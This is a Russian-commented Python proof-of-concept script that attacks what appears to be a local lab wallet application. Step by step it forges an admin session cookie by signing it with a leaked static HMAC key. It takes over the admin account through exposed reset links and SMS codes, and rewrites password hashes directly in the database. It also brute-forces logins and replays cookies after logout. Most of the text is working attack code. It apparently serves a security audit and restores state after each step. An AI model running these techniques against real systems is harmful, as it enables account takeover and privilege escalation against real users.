#!/usr/bin/env python3
"""
stage_access.py — «Доступы»: как получить чужой аккаунт и чужую роль.

    python3 poc/stage_access.py

Стенд должен быть поднят: docker compose up -d --build
Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
"""
from lib import *  # noqa: F401,F403

VICTIM = "adminw"
HACK_PASS = "Hack1234"


def main():
    step("1. вход под рабочей учёткой")
    say("Нужна любая живая учётка — дальше всё остальное вытягивается из неё.",
        "Тестовая ivanov/workplace1, куки складываем в Client.")
    client = login_as("ivanov", "workplace1")
    if not client:
        fail("не удалось войти, стенд поднят?")
        return 1
    ok("сессия получена")

    step("2. OW-28/OW-35: фейк админ-куки: роль в подписи, ключ в статике")
    say("При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль>).",
        "Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется",
        "(auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,",
        "поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен.")
    uid = db("SELECT id FROM users WHERE login='%s'" % VICTIM)
    sig = sign(SESSION_KEY, "%s:admin" % uid)
    cookie = "ow_session=ow.%s.admin.%s" % (uid, sig)
    info("HMAC-SHA256(%s, '%s:admin') = %s..." % (SESSION_KEY, uid, sig[:20]))
    r = req("GET /admin/secrets  Cookie: ow_session=ow.%s.admin.<hmac>" % uid,
            "/admin/secrets", cookie=cookie)
    if "Админ Кошелька" in r:
        artifact("OW-28/OW-35 · поддельная админ-сессия",
                 "подписанное значение: ow.%s.admin.<HMAC>" % uid,
                 "GET /admin/secrets → HTTP %s; в ответе найден заголовок админки" % r.status)
        ok("админка открыта без пароля")
    else:
        fail("админка не открылась")

    say("Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей",
        "(админская страница, handlers_auth.go:158-179).")
    r = req("GET /gateway/sms  (коды сброса паролей всех пользователей)",
            "/gateway/sms", cookie=cookie)
    sms_hits = r.findall(r"код подтверждения сброса \d+")[:3]
    for hit in sms_hits:
        info(hit)
    if sms_hits:
        artifact("OW-28 · SMS-коды доступны под поддельной ролью",
                 "GET /gateway/sms → HTTP %s; извлечено строк кодов: %s" % (r.status, len(sms_hits)))

    step("3. OW-26/OW-27: полный захват пароля жертвы через сброс")
    say("Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:",
        " 1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему",
        "    (handlers_auth.go:181-200) — забираем её оттуда;",
        " 2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;",
        " 3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146).")
    old_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    req("POST /password/forgot  login=%s (письмо и SMS уходят в общие ящики)" % VICTIM,
        "/password/forgot", client=client, data={"login": VICTIM})
    r = req("GET /mail  (весь outbox виден иванову)", "/mail", client=client)
    m = r.search(r"/password/reset\?rid=(\d+)")
    if not m:
        fail("ссылку на сброс в почте не нашли")
        return 1
    rid = m.group(1)
    r = req("GET /gateway/sms  (код по заявке #%s)" % rid, "/gateway/sms",
            cookie=cookie)
    m = r.search(r"код подтверждения сброса (\d+) \(заявка #%s\)" % rid)
    if not m:
        fail("код из SMS-шлюза не нашли")
        return 1
    code = m.group(1)
    info("ссылка: /password/reset?rid=%s   код: %s" % (rid, code))
    reset_resp = req("POST /password/reset  rid=%s&sms_code=%s&password=%s" % (rid, code, HACK_PASS),
        "/password/reset",
        data={"rid": rid, "sms_code": code, "password": HACK_PASS})
    hacked_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    hacked_login = login_as(VICTIM, HACK_PASS)
    if hacked_login:
        artifact("OW-26/OW-27 · сброс сменил пароль жертвы",
                 "reset request rid=%s sms_code=<получен из gateway> → HTTP %s" % (rid, reset_resp.status),
                 "password_hash изменён: %s → %s" % (old_hash[:18] + "…", hacked_hash[:18] + "…"),
                 "POST /login новым паролем → HTTP 302 (сессия выдана)")
        ok("пароль админа заменён, зашли: %s / %s" % (VICTIM, HACK_PASS))
    else:
        fail("вход под новым паролем не прошёл")
    db("UPDATE users SET password_hash='%s' WHERE login='%s'" % (old_hash, VICTIM))
    restored_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    info("пароль %s восстановлен: hash совпал=%s" % (VICTIM, restored_hash == old_hash))

    step("4. OW-34: смена пароля напрямую в базе")
    say("Второй способ, вообще без приложений и SMS: пароль БД wallet/wallet лежит в",
        "docker-compose.yml, порт открыт в сети compose (sslmode=disable). Обратного",
        "чтения bcrypt нет, но хеш заменяется на любой. Расширения pgcrypto в базе нет,",
        "поэтому готовый хеш не генерируем, а копируем: ставим жертве пароль, который",
        "мы и так знаем от ivanov.")
    original_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    db("UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE "
       "login='ivanov') WHERE login='%s'" % VICTIM)
    copied_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    copied_login = login_as(VICTIM, "workplace1")
    if copied_login and copied_hash and copied_hash != original_hash:
        artifact("OW-34 · прямая запись в таблицу пользователей",
                 "hash жертвы изменён: %s → скопирован hash ivanov=%s" %
                 (original_hash[:18] + "…", copied_hash[:18] + "…"),
                 "POST /login victim/workplace1 → HTTP 302; вход успешен")
        ok("зашли: %s / workplace1 — пароль иванова стал паролем админа" % VICTIM)
    else:
        fail("вход под скопированным паролем не прошёл")
    db("UPDATE users SET password_hash='%s' WHERE login='%s'" % (original_hash, VICTIM))
    restored_hash = db("SELECT password_hash FROM users WHERE login='%s'" % VICTIM)
    info("пароль %s восстановлен: hash совпал=%s" % (VICTIM, restored_hash == original_hash))

    step("5. OW-28: блокировка пользователя не работает")
    say("Бухгалтер может заблокировать сотрудника — флаг blocked есть в базе и в сессии",
        "читается, но нигде не проверяется: ни при входе, ни дальше по работе",
        "(auth.go:17-44, в handlers_auth.go проверки вообще нет). То есть блокировка —",
        "это косметика: человек продолжает работать, пока сам не выйдет.")
    before_block = db("SELECT blocked FROM users WHERE login='ivanov'")
    db("UPDATE users SET blocked=TRUE WHERE login='ivanov' RETURNING login, blocked;")
    blocked_login = login_as("ivanov", "workplace1")
    after_block = db("SELECT blocked FROM users WHERE login='ivanov'")
    if blocked_login and after_block == "t":
        artifact("OW-28 · blocked=true не запрещает аутентификацию",
                 "users.blocked: %s → %s" % (before_block, after_block),
                 "POST /login ivanov/workplace1 → HTTP 302; сессия выдана")
        ok("заблокированный всё равно входит")
    else:
        fail("вход под заблокированным не прошёл — блокировка работает?")
    r = req("GET /  (старая сессия продолжает работать)", "/", client=client,
            quiet=True)
    info("← старая сессия тоже жива: HTTP %d" % r.status)
    db("UPDATE users SET blocked=FALSE WHERE login='ivanov' RETURNING login, blocked;")
    info("после теста blocked=%s" % db("SELECT blocked FROM users WHERE login='ivanov'"))
    info("ivanov разблокирован обратно")

    step("6. OW-23: перебор пароля без ограничений")
    say("Ни капчи, ни счётчика попыток, ни задержки: шесть неверных паролей подряд —",
        "шесть одинаковых ответов, ни одной блокировки, аккаунт жив.")
    for i in range(1, 7):
        r = req("POST /login  login=ivanov password=nope", "/login",
                data={"login": "ivanov", "password": "nope", "return": "/"},
                quiet=True)
        print("    → попытка %d: login=ivanov password=nope   ← HTTP %d"
              % (i, r.status))
    if login_as("ivanov", "workplace1"):
        artifact("OW-23 · шесть неудачных попыток без блокировки",
                 "неверные POST /login: 6; HTTP-коды: все 302 (см. строки выше)",
                 "контрольный вход правильным паролем прошёл → лимит/блокировка не сработали")
        ok("после шести ошибок вход по-прежнему работает, блокировки нет")
    else:
        fail("что-то заблокировалось — сбрось стенд")

    step("7. OW-29: выход не отзывает сессию на сервере")
    say("Logout только ставит пустую куку в браузере (auth.go:64-66) — на сервере",
        "ничего не хранится и не отзывается: кука подписана ключом и живёт, пока",
        "жив браузер. Значит украденная кука работает и после того, как жертва",
        "нажала «Выход», и через год — срока у сессии нет вовсе (OW-29).")
    victim = login_as("ivanov", "workplace1")
    stolen = victim.session()
    info("украденная кука: ow_session=%s..." % stolen[:24])
    req("GET /logout  (жертва выходит)", "/logout", client=victim)
    r = req("GET /  той же кукой ПОСЛЕ выхода", "/", cookie="ow_session=" + stolen)
    if r.status == 200 and ("Обзор" in r or "Счёт" in r):
        artifact("OW-29 · cookie не отозвана logout",
                 "GET /logout → браузер получил пустую cookie, копия украденной сохранена",
                 "повторный GET / с прежним ow_session → HTTP %s, кабинет доступен" % r.status)
        ok("кука после logout всё ещё открывает кабинет — отзыв только на клиенте")
    else:
        fail("кука после logout перестала работать — сессии вдруг отзываются")

    step("8. OW-24: ошибка хеширования при регистрации игнорируется")
    say("hashPassword падает на пароле длиннее 72 байт (лимит bcrypt), ошибка",
        "вызывается молча (handlers_auth.go:80), и в базу пишется пустой хеш.",
        "Аккаунт создаётся, пароль не сохранён — войти в него нельзя никогда,",
        "и восстановить тоже нельзя: сброс тот же bcrypt. Аккаунт-зомби.")
    import time
    login = "ow24_%d" % int(time.time())
    req("POST /register  login=%s password=<100 символов>" % login, "/register",
        client=client, data={"login": login, "display_name": "Тест OW-24",
                             "email": "%s@x.local" % login, "password": "A" * 100})
    row = db("SELECT login||'|'||length(password_hash) FROM users WHERE login='%s';"
             % login)
    r = req("POST /login  %s / <тот же длинный пароль>" % login, "/login",
            data={"login": login, "password": "A" * 100, "return": "/"},
            quiet=True)
    info("← HTTP %d на вход с исходным паролем" % r.status)
    if row == "%s|0" % login:
        artifact("OW-24 · ошибка bcrypt проигнорирована",
                 "POST /register с password длиной 100 → HTTP %s" % r.status,
                 "users.login|length(password_hash): %s" % row,
                 "повторный POST /login → HTTP %s; пароль не позволяет войти" % r.status)
        ok("в базе пустой хеш (length=0): пароль не записан, вход невозможен — "
           "регистрация с длинным паролем создаёт нерабочий аккаунт")
    else:
        info("хеш в базе: %s" % row)
    db("DELETE FROM users WHERE login='%s';" % login)
    info("тестовый аккаунт %s удалён из базы" % login)
    return 0


if __name__ == "__main__":
    sys.exit(main())
